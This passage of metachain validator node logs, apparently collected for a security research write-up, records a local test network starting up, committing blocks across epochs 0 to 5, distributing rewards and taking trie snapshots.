[0;32mINFO [0m[2026-10-06 22:11:21.022] [process/block]      [metachain/3/94/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 94 [0;32mnonce[0m = 91 [0;32mhash[0m = e593dafa4bbd3ce51d9762a9a3d2ad8c24b0bde274bef1dbfa2b2dea501e2d7b 
[0;32mINFO [0m[2026-10-06 22:11:27.017] [process/block]      [metachain/3/95/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 95 [0;32mnonce[0m = 92 [0;32mhash[0m = aa20ba0402ce43e10fb77851d5db12e246efc6a429f596d489adc249f29161dc 
[0;32mINFO [0m[2026-10-06 22:11:33.018] [process/block]      [metachain/3/96/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 4294967295 [0;32mround[0m = 96 [0;32mnonce[0m = 93 [0;32mhash[0m = c45ed6389c88e2d2c18a964feb33e87855e34274f298d1263cb249c486bdeeef 
[0;32mINFO [0m[2026-10-06 22:11:39.005] [processProxy]       [metachain/4/97/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:39.009] [..hStart/metachain] [metachain/4/97/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:11:39.009] [..hStart/metachain] [metachain/4/97/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3673434658148159309 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:11:40.227] [process/block]      [metachain/4/97/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 97 [0;32mnonce[0m = 94 [0;32mhash[0m = d97d6366ddaf6c951512b1ed0307e1b11a5b6014a740f879d3804379517df773 
[0;32mINFO [0m[2026-10-06 22:11:40.230] [state]              [metachain/4/97/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 066702335a2811dcddf50786573dd21d10c4dc166fb9efe7074d97ae39ae59c8 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:40.230] [state]              [metachain/4/97/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = 1d8f0eaef835a1b4ce126bb997b2e3493fc1839419674119d2fd5f4656c82ca9 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:45.022] [process/block]      [metachain/4/98/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 98 [0;32mnonce[0m = 95 [0;32mhash[0m = 51ac71436f4951c2f5ab6593b92534367dde96f2127ff9b0bc064d91bb8b93bd 
[0;32mINFO [0m[2026-10-06 22:11:51.023] [process/block]      [metachain/4/99/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 99 [0;32mnonce[0m = 96 [0;32mhash[0m = 3bf36fa4535e682b5022fc065ba0c03528efc937806cc2b36bac8b0b0b12ab41 
[0;32mINFO [0m[2026-10-06 22:11:57.027] [process/block]      [metachain/4/100/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 100 [0;32mnonce[0m = 97 [0;32mhash[0m = 3d1385849c2a9a57acca75f86c065ce300b95ea89c80ed347de0733b2c51dfef 
[0;32mINFO [0m[2026-10-06 22:12:03.018] [process/block]      [metachain/4/101/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 101 [0;32mnonce[0m = 98 [0;32mhash[0m = 14b48d871da346dca320aca2b8ec24f55715c8d129f354161252ab0709851270 
[0;32mINFO [0m[2026-10-06 22:12:09.023] [process/block]      [metachain/4/102/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 102 [0;32mnonce[0m = 99 [0;32mhash[0m = f2a64ad009da321b4597927157a9d44495a4f838fd2a9743def0a43332197d3d 
[0;32mINFO [0m[2026-10-06 22:12:15.027] [process/block]      [metachain/4/103/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 103 [0;32mnonce[0m = 100 [0;32mhash[0m = 0a0aebc38ddb7774fa83becf49d66b815e2b7373a53e896cf4ac6178e4ff88c1 
[0;32mINFO [0m[2026-10-06 22:12:21.035] [process/block]      [metachain/4/104/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 104 [0;32mnonce[0m = 101 [0;32mhash[0m = 93909d5419c830ea178befcff0ab7d46b4fc349d6f77f77eb03fb90738ba82b9 
[0;32mINFO [0m[2026-10-06 22:12:27.021] [process/block]      [metachain/4/105/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 105 [0;32mnonce[0m = 102 [0;32mhash[0m = aef22663c6cf3c9081285f817494ca508f632ed5c19a7e51507ef0f64013ab73 
[0;32mINFO [0m[2026-10-06 22:12:33.022] [process/block]      [metachain/4/106/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 106 [0;32mnonce[0m = 103 [0;32mhash[0m = 50c9479a796694f65a265beb23fdf69759624225e6875979fa249961b72b3a92 
[0;32mINFO [0m[2026-10-06 22:12:39.018] [process/block]      [metachain/4/107/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 107 [0;32mnonce[0m = 104 [0;32mhash[0m = c7e85839a7854379c8234929d109950287e12724968ddab064f951f420ff4893 
[0;32mINFO [0m[2026-10-06 22:12:45.018] [process/block]      [metachain/4/108/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 108 [0;32mnonce[0m = 105 [0;32mhash[0m = 6880f6f148acbdc2fd846db3852e42f14afc7c6f560896a88c760bcb1bf787c2 
[0;32mINFO [0m[2026-10-06 22:12:51.029] [process/block]      [metachain/4/109/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 109 [0;32mnonce[0m = 106 [0;32mhash[0m = 36ea4d7674a364705426dc3a7304eadf0fe29b06b3e98b52e5361acd997600c7 
[0;32mINFO [0m[2026-10-06 22:12:57.022] [process/block]      [metachain/4/110/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 110 [0;32mnonce[0m = 107 [0;32mhash[0m = 2ed5262f4ab4498a964ff5f7b5d6d6be4bc369840f0c729dafa154145f0e2f1a 
[0;32mINFO [0m[2026-10-06 22:13:03.013] [process/block]      [metachain/4/111/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 111 [0;32mnonce[0m = 108 [0;32mhash[0m = 6832733afbc8e6de0e79fb3e16c6f5cf1aad4e639528fab7826ea013fa6b3e4e 
[0;32mINFO [0m[2026-10-06 22:13:09.020] [process/block]      [metachain/4/112/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 112 [0;32mnonce[0m = 109 [0;32mhash[0m = e0d3b72262176067e4822686de342efed36dd30f491bdcfce4f07d107a93e843 
[0;32mINFO [0m[2026-10-06 22:13:15.024] [process/block]      [metachain/4/113/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 113 [0;32mnonce[0m = 110 [0;32mhash[0m = db6e4f1e9a4b4d3db329d583af2b7f7a5f9a052ca06ebf345fdefb3b9789896f 
[0;32mINFO [0m[2026-10-06 22:13:21.024] [process/block]      [metachain/4/114/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 114 [0;32mnonce[0m = 111 [0;32mhash[0m = 82e77406b72b27c2514141fbfcdfd4d43d1e33ee38ac0533ef7015f7ef9bf223 
[0;32mINFO [0m[2026-10-06 22:13:27.022] [process/block]      [metachain/4/115/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 115 [0;32mnonce[0m = 112 [0;32mhash[0m = d1ba42428579d479e4e65f6dbd77fcd2840b7845b85396058382b4282e29b7cf 
[0;32mINFO [0m[2026-10-06 22:13:33.021] [process/block]      [metachain/4/116/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 116 [0;32mnonce[0m = 113 [0;32mhash[0m = 93b69b44b56f4b4b81c12155dc355cb73f4da181cc015d047d2e0ba5abcae7b5 
[0;32mINFO [0m[2026-10-06 22:13:39.022] [process/block]      [metachain/4/117/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 117 [0;32mnonce[0m = 114 [0;32mhash[0m = 7412c0e7252b5856bec2c5963efec2e5fe7309b96408c6594f64ac4ff4ccd4a1 
[0;32mINFO [0m[2026-10-06 22:13:45.016] [process/block]      [metachain/4/118/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 118 [0;32mnonce[0m = 115 [0;32mhash[0m = aae8b740f6a9fb07dd76e731ed5ac8adaa7d4f4bf7c0c9055d068bcd839fe36a 
[0;32mINFO [0m[2026-10-06 22:13:51.024] [process/block]      [metachain/4/119/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 4294967295 [0;32mround[0m = 119 [0;32mnonce[0m = 116 [0;32mhash[0m = 742ded8bdae4b18a0cadb4565c4e421856f511315668fb608c543c62601ac10c 
[0;32mINFO [0m[2026-10-06 22:13:57.003] [processProxy]       [metachain/5/120/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:13:57.007] [..hStart/metachain] [metachain/5/120/(BLOCK)] auctionListSelector.SelectNodesFromAuctionList: empty auction list; skip selection 
[0;32mINFO [0m[2026-10-06 22:13:57.007] [..hStart/metachain] [metachain/5/120/(BLOCK)] rewards to be distributed                [0;32mtotalStakeEligible[0m = 15000000000000000000000 [0;32mtotalTopUpEligible[0m = 0 [0;32mbaseRewards[0m = 3673436007558740681 [0;32mtopUpRewards[0m = 0 
[0;32mINFO [0m[2026-10-06 22:13:58.306] [process/block]      [metachain/5/120/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 120 [0;32mnonce[0m = 117 [0;32mhash[0m = a5965962f0001392e147070206b09c5d5ceb0f7fc7e11abf511dac847eafe513 
[0;32mINFO [0m[2026-10-06 22:13:58.310] [state]              [metachain/5/120/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 066702335a2811dcddf50786573dd21d10c4dc166fb9efe7074d97ae39ae59c8 [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:13:58.310] [state]              [metachain/5/120/(END_ROUND)] starting snapshot                        [0;32mtype[0m = peer trie [0;32mrootHash[0m = 2c700ea96509eca5f766dc45911b057b5a1ab9e8c4e0d17494223dbd9549cef1 [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:14:03.025] [process/block]      [metachain/5/121/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 121 [0;32mnonce[0m = 118 [0;32mhash[0m = 9ab35b5f657875a10a852a707e911f69173d8b5ae7de205dbc137a20c9d7268e 
[0;32mINFO [0m[2026-10-06 22:14:09.018] [process/block]      [metachain/5/122/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 122 [0;32mnonce[0m = 119 [0;32mhash[0m = 50f910007d7b06bc13fdde42d1dc3c59046301a356e378b6080dd2cea4c2c335 
[0;32mINFO [0m[2026-10-06 22:14:15.027] [process/block]      [metachain/5/123/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 123 [0;32mnonce[0m = 120 [0;32mhash[0m = 05dcb220f804060b49fa989246f135edc961b5fcf16c5bb6b7982c46f6655588 
[0;32mINFO [0m[2026-10-06 22:14:21.023] [process/block]      [metachain/5/124/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 124 [0;32mnonce[0m = 121 [0;32mhash[0m = 7283e19ecdad4d0709bd01ff23b27caf8f3ebbdef5cf5571459e71585f2dc7e0 
[0;32mINFO [0m[2026-10-06 22:14:27.015] [process/block]      [metachain/5/125/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 125 [0;32mnonce[0m = 122 [0;32mhash[0m = dd63786cf55f3ee595c42992b439c2dd7e4438c4314a56b3a132bcf09fe210fa 
[0;32mINFO [0m[2026-10-06 22:14:33.027] [process/block]      [metachain/5/126/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 126 [0;32mnonce[0m = 123 [0;32mhash[0m = 12ca7cb6897310f7990895358652a2382b1eadf3487941f98fe197f84ba033c4 
[0;32mINFO [0m[2026-10-06 22:14:34.068] [node]               [metachain/5/126/(END_ROUND)] terminating at user's signal...          
```

### C 5.1, validator1 full log, shard process started 22:01:39, 123 blocks committed, terminated 22:14:33

File `security-research/node-logs/validator1.log`.

```text
[0;32mINFO [0m[2026-10-06 22:01:39.371] [node]               [/0/0/]        starting node                            [0;32mversion[0m = v1.0.0/go1.26.4/darwin-arm64/3bd876d357 [0;32mpid[0m = 43284 
[0;32mINFO [0m[2026-10-06 22:01:39.373] [factory]            [/0/0/]        start time                               [0;32mformatted[0m = Tue Oct 6 22:01:57 WAT 2026 [0;32munix timestamp[0m = 1791320517 [0;32msupernova unix timestamp[0m = 1791323157 [0;32mround duration[0m = 6s [0;32msupernova round duration[0m = 6s 
[0;32mINFO [0m[2026-10-06 22:01:39.376] [factory]            [/0/0/]        the node loaded the validatorKey.pem file and is running in single-key mode 
[0;32mINFO [0m[2026-10-06 22:01:39.400] [factory]            [/0/0/]        p2p private key: generated a new private key for p2p signing 
[0;32mINFO [0m[2026-10-06 22:01:39.408] [main/p2p]           [/0/0/]        listening on addresses                   [0;32maddr0[0m = /ip4/127.0.0.1/tcp/21501/p2p/16Uiu2HAm6ine3CCsd2Q3DdHagRnbcqLjZPkbRj8mEEuYtmw1e6mA [0;32maddr1[0m = /ip4/172.20.10.5/tcp/21501/p2p/16Uiu2HAm6ine3CCsd2Q3DdHagRnbcqLjZPkbRj8mEEuYtmw1e6mA 
[0;32mINFO [0m[2026-10-06 22:01:39.409] [main/p2p]           [/0/0/]        started the network discovery process... 
[0;32mINFO [0m[2026-10-06 22:01:59.411] [factory]            [/0/0/]        shard info                               [0;32mstarted in shard[0m = metachain 
[0;32mINFO [0m[2026-10-06 22:01:59.412] [factory]            [/0/0/]        bootstrap parameters                     [0;32mshardId[0m = 4294967295 [0;32mepoch[0m = 0 [0;32mnumShards[0m = 1 
[0;32mINFO [0m[2026-10-06 22:01:59.412] [node]               [/0/0/]        Bootstrap                                [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.128] [..nodesCoordinator] [metachain/0/0/] new nodes config is set for epoch        [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.154] [vmContainerFactory] [metachain/0/0/] VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:06.159] [processProxy]       [metachain/0/0/] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.090] [processProxy]       [metachain/0/0/] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.093] [genesis/process]    [metachain/0/0/] genesisBlockCreator.createHeaders        [0;32mshard[0m = 0 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 
[0;32mINFO [0m[2026-10-06 22:02:09.093] [genesis/process]    [metachain/0/0/] genesisBlockCreator.createHeaders        [0;32mshard[0m = 4294967295 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 5b8c8589b3a99e69f13a0e556ed873b94e6236d4756c19ebd16de6e62792ff8d 
[0;32mINFO [0m[2026-10-06 22:02:09.158] [processProxy]       [metachain/0/0/] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.158] [..hStart/metachain] [metachain/0/0/] rewardsCreatorProxy                      [0;32mconfigured[0m = rewardsCreatorV1 
[0;32mINFO [0m[2026-10-06 22:02:09.176] [factory]            [metachain/0/0/] indexGenesisBlocks(): historyRepo.RecordBlock [0;32mshardID[0m = 4294967295 [0;32mhash[0m = f310653903260e6450f3516d6e5fb4cfd30e83ea060fd6281f74688474ff1b5f 
[0;33mWARN [0m[2026-10-06 22:02:09.251] [state]              [metachain/0/0/] could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;33mWARN [0m[2026-10-06 22:02:09.251] [state]              [metachain/0/0/] could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;32mINFO [0m[2026-10-06 22:02:09.255] [factory]            [metachain/0/0/] starting consensus                       [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.259] [node]               [metachain/0/2/(START_ROUND)] application is now running               
[0;32mINFO [0m[2026-10-06 22:02:09.848] [processProxy]       [metachain/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;33mWARN [0m[2026-10-06 22:02:09.918] [headersForBlock]    [metachain/0/2/(BLOCK)] requestMissingAndUpdateBasedOnCrossShardData could not find last notarized [0;33mshard[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:15.076] [process/block]      [metachain/0/3/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 3 [0;32mnonce[0m = 1 [0;32mhash[0m = 12a2339fb0730bda3c27b9226935b40d491b42a1dcacaa4d302ac82b60b1ccff 
[0;32mINFO [0m[2026-10-06 22:02:21.020] [process/block]      [metachain/0/4/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 4 [0;32mnonce[0m = 2 [0;32mhash[0m = 951e23813fdcc5cf1567df637cb7b089354c0d087a48d87d24ce1587beba1a1c 
[0;32mINFO [0m[2026-10-06 22:02:27.022] [process/block]      [metachain/0/5/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 5 [0;32mnonce[0m = 3 [0;32mhash[0m = 8519f48973214551eae07f5cce0c02a65859d4df1d6e4a9069bc0c51a18ca923 
[0;32mINFO [0m[2026-10-06 22:02:33.018] [process/block]      [metachain/0/6/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 6 [0;32mnonce[0m = 4 [0;32mhash[0m = 16a2ec737af8fef9da8dfe081fef92eb31712666805b455b68bd0f809bd34272 
[0;32mINFO [0m[2026-10-06 22:02:39.016] [process/block]      [metachain/0/7/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 7 [0;32mnonce[0m = 5 [0;32mhash[0m = 52f596da93a8a4621a9c6348ecf1bf1613c2d547750bddb0fc713641838e84d5 
[0;32mINFO [0m[2026-10-06 22:02:45.015] [process/block]      [metachain/0/8/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 8 [0;32mnonce[0m = 6 [0;32mhash[0m = 78b9669a254564cfd079eb83f0a46a11f1a41edcd4c899c9611c6d81fc4de343 
[0;32mINFO [0m[2026-10-06 22:02:51.020] [process/block]      [metachain/0/9/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 9 [0;32mnonce[0m = 7 [0;32mhash[0m = b55a7e80de17e54723d2758444e4b8379cbf8b0715f384bb5817c43aba353db3 
[0;32mINFO [0m[2026-10-06 22:02:57.021] [process/block]      [metachain/0/10/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 10 [0;32mnonce[0m = 8 [0;32mhash[0m = 5ded2dcf853fd20e5df12172db569ebb30f2f7a103fcceaccc4a493984178597 
[0;32mINFO [0m[2026-10-06 22:03:03.014] [process/block]      [metachain/0/11/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 11 [0;32mnonce[0m = 9 [0;32mhash[0m = a7268cc50bef6890ad5250ae81a421b0eeeba9bee2b81841d0305eb97d08f25d 
[0;32mINFO [0m[2026-10-06 22:03:09.022] [process/block]      [metachain/0/12/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 12 [0;32mnonce[0m = 10 [0;32mhash[0m = 0408be04a4bef43fe9029763ab9fe8fa6ee3f7791dcd8639f9e0bf5452a09c54 
[0;32mINFO [0m[2026-10-06 22:03:15.014] [process/block]      [metachain/0/13/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 13 [0;32mnonce[0m = 11 [0;32mhash[0m = a358a2d844e36110bb0c66af1bd18394b76c9ed82b56e69246b2146315ebf300 
[0;32mINFO [0m[2026-10-06 22:03:21.025] [process/block]      [metachain/0/14/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 14 [0;32mnonce[0m = 12 [0;32mhash[0m = 8868b55de9e2f0f527cecf61a6e88dba0267902bab72107d39ba7cac14afbbe7 
[0;32mINFO [0m[2026-10-06 22:03:27.020] [process/block]      [metachain/0/15/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 15 [0;32mnonce[0m = 13 [0;32mhash[0m = f59d0806e2761391b02e5b2217f634afa362b8a1409f7f2075e7981bc141b6bd 
[0;32mINFO [0m[2026-10-06 22:03:33.022] [process/block]      [metachain/0/16/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 16 [0;32mnonce[0m = 14 [0;32mhash[0m = 856850e81f264b3b743c570ee15ae325824af5b20ef6ceec1c822b3a77dd7ec8 
[0;32mINFO [0m[2026-10-06 22:03:39.023] [process/block]      [metachain/0/17/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 17 [0;32mnonce[0m = 15 [0;32mhash[0m = 3835a9739fbd434377f197fa0c1b368bb68aa3dd94f0de3ff76c9b7961fe4fd0 
[0;32mINFO [0m[2026-10-06 22:03:45.024] [process/block]      [metachain/0/18/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 18 [0;32mnonce[0m = 16 [0;32mhash[0m = 93d3233141e1ea1259063a9e9af04fac1be31fe48b7d0eb2c1b1e4ef9f000375 
[0;32mINFO [0m[2026-10-06 22:03:51.016] [process/block]      [metachain/0/19/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 19 [0;32mnonce[0m = 17 [0;32mhash[0m = a1d81ee7b974ddbda7525446722f80e20bd9fcb30268b6f22bb6d99067ed5d7f 
[0;32mINFO [0m[2026-10-06 22:03:57.013] [process/block]      [metachain/0/20/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 20 [0;32mnonce[0m = 18 [0;32mhash[0m = 9a769d7cc0d2323726414e2725388657069bdd68c2064f310adc693daeb0e766 
[0;32mINFO [0m[2026-10-06 22:04:03.017] [process/block]      [metachain/0/21/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 21 [0;32mnonce[0m = 19 [0;32mhash[0m = 2355a573d2bda563b5e6b723078bfa7c5f05233e7dc4a0b981164fc790efaa77 
[0;32mINFO [0m[2026-10-06 22:04:09.018] [process/block]      [metachain/0/22/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 22 [0;32mnonce[0m = 20 [0;32mhash[0m = fbf3d7a3a6737797021a4a92f129fb3bc249f2eb52cda57ff681a7b3b799aa94 
[0;32mINFO [0m[2026-10-06 22:04:15.015] [process/block]      [metachain/0/23/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 23 [0;32mnonce[0m = 21 [0;32mhash[0m = 5cb7af23566d8a128f6a309b5e084604f28c253035d1213127798f527be72234 
[0;32mINFO [0m[2026-10-06 22:04:21.019] [process/block]      [metachain/0/24/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 24 [0;32mnonce[0m = 22 [0;32mhash[0m = 73441307f38120f3167affae1b4a4700880f2fa4451bc2fc3b06bf52bef3f0f7 
[0;32mINFO [0m[2026-10-06 22:04:27.020] [processProxy]       [metachain/0/25/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:36.910] [process/block]      [metachain/1/26/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 26 [0;32mnonce[0m = 23 [0;32mhash[0m = 48bc76f2b1f76746c24d2d2ee6d6ecda3235379eb68e73f5800864abaccf4a13 
[0;32mINFO [0m[2026-10-06 22:04:39.020] [process/block]      [metachain/1/27/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 27 [0;32mnonce[0m = 24 [0;32mhash[0m = d8f34316ac1969379af928270b98716113d8571e0dd078b78feb673c13c6cc9c 
[0;32mINFO [0m[2026-10-06 22:04:45.021] [process/block]      [metachain/1/28/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 28 [0;32mnonce[0m = 25 [0;32mhash[0m = 1dd773763e7d28749f565629ea826a1dc64464a7a1f9749161667a263dc02d89 
[0;32mINFO [0m[2026-10-06 22:04:51.033] [process/block]      [metachain/1/29/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 29 [0;32mnonce[0m = 26 [0;32mhash[0m = 075fc829aa2a0e31757ef9fd0ffe65b7a319359f1ac2af984de8b4885218b6e4 
[0;32mINFO [0m[2026-10-06 22:04:57.019] [process/block]      [metachain/1/30/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 30 [0;32mnonce[0m = 27 [0;32mhash[0m = a6e1d0e03afe6fae38f87c178bc2c4ea9ffb244359cba7e8d4634999c11d8c98 
[0;32mINFO [0m[2026-10-06 22:05:03.021] [process/block]      [metachain/1/31/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 31 [0;32mnonce[0m = 28 [0;32mhash[0m = 1461e117b1b67074be060833c0efcb277c34c3640968cf6b1cd4c86baf7ddd6a 
[0;32mINFO [0m[2026-10-06 22:05:09.019] [process/block]      [metachain/1/32/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 32 [0;32mnonce[0m = 29 [0;32mhash[0m = 0171c478e881722c0cf6d1d3def6eac169bdc9528bfae009e12b219a9be26966 
[0;32mINFO [0m[2026-10-06 22:05:15.034] [process/block]      [metachain/1/33/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 33 [0;32mnonce[0m = 30 [0;32mhash[0m = 0b0e1dd742f732399dae897f6aa3380dbcff32b3a629b6f5e80d8101c021c13e 
[0;32mINFO [0m[2026-10-06 22:05:21.023] [process/block]      [metachain/1/34/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 4294967295 [0;32mround[0m = 34 [0;32mnonce[0m = 31 [0;32mhash[0m = d9c66a3cb6720911de9d8aaf2db9a1a1c757cae5e8ef7d8299052ec62dcfc264 
